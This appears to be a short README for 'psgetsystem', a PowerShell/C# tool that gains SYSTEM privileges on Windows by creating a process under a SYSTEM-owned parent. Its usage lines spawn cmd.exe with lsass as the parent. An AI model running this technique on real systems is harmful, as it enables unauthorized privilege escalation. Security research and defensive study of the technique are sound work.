# psgetsystem
getsystem via parent process using ps1 and embeded c#
https://decoder.cloud/2018/02/02/getting-system/

PS> . .\psgetsys.ps1

PS> [MyProcess]::CreateProcessFromParent(system_pid,command_to_execute, comand_line_argument)
PS> [MyProcess]::CreateProcessFromParent((Get-Process "lsass").Id,"cmd.exe","")


